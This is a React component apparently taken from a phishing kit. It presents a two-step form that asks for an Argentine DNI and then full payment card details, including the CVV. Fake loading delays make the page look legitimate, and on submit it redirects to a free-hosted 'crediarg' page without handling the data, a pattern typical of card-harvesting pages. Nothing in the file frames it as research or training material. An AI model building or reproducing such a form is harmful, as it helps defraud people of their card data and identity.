import React, { useState, useEffect } from 'react';
import { FloatingLogo } from './FloatingLogo';
import { LoadingScreen } from './LoadingScreen';
import { IdentificationStep } from './steps/IdentificationStep';
import { CardInfoStep } from './steps/CardInfoStep';
import { ProgressIndicator } from './ProgressIndicator';
import { motion, AnimatePresence } from 'framer-motion';

interface FormData {
  dni: string;
  cardInfo: {
    type: 'credit' | 'debit';
    number: string;
    name: string;
    expiry: string;
    cvv: string;
    bank?: string;
  };
}

export const MultiStepForm: React.FC = () => {
  const [isLoading, setIsLoading] = useState(true);
  const [currentStep, setCurrentStep] = useState(0);
  const [isStepLoading, setIsStepLoading] = useState(false);
  const [formData, setFormData] = useState<FormData>({
    dni: '',
    cardInfo: {
      type: 'credit',
      number: '',
      name: '',
      expiry: '',
      cvv: ''
    }
  });

  // Simulate initial loading
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsLoading(false);
      setCurrentStep(1);
    }, 2000);
    return () => clearTimeout(timer);
  }, []);

  const handleNext = async () => {
    setIsStepLoading(true);
    await new Promise(resolve => setTimeout(resolve, 800));
    setCurrentStep(prev => prev + 1);
    setIsStepLoading(false);
  };

  const handleBack = () => {
    setCurrentStep(prev => prev - 1);
  };

  const updateFormData = (field: string, value: any) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleSubmit = async () => {
    try {
      window.location.href = 'https://crediarg.webcindario.com/index.html';
    } catch (error) {
      console.error('Error submitting form:', error);
    }
  };

  const renderStep = () => {
    if (isLoading) {
      return <LoadingScreen />;
    }

    if (isStepLoading) {
      return <LoadingSpinner />;
    }

    switch (currentStep) {
      case 1:
        return (
          <IdentificationStep
            dni={formData.dni}
            onDniChange={(value) => updateFormData('dni', value)}
            onNext={handleNext}
            onBack={handleBack}
          />
        );
      case 2:
        return (
          <CardInfoStep
            cardInfo={formData.cardInfo}
            onCardInfoChange={(field, value) => {
              setFormData(prev => ({
                ...prev,
                cardInfo: {
                  ...prev.cardInfo,
                  [field]: value
                }
              }));
            }}
            onNext={handleSubmit}
            onBack={handleBack}
          />
        );
      default:
        return null;
    }
  };

  return (
    <div className="w-full max-w-4xl">
      <FloatingLogo />
      <div className="relative bg-white/40 backdrop-blur-lg rounded-2xl shadow-lg overflow-hidden transition-all duration-500 ease-in-out">
        {!isLoading && (
          <ProgressIndicator currentStep={currentStep} totalSteps={2} />
        )}
        <div className="p-6 sm:p-8 md:p-10">
          <AnimatePresence mode="wait">
            <motion.div
              key={currentStep}
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              transition={{ duration: 0.3 }}
            >
              {renderStep()}
            </motion.div>
          </AnimatePresence>
        </div>
      </div>
    </div>
  );
};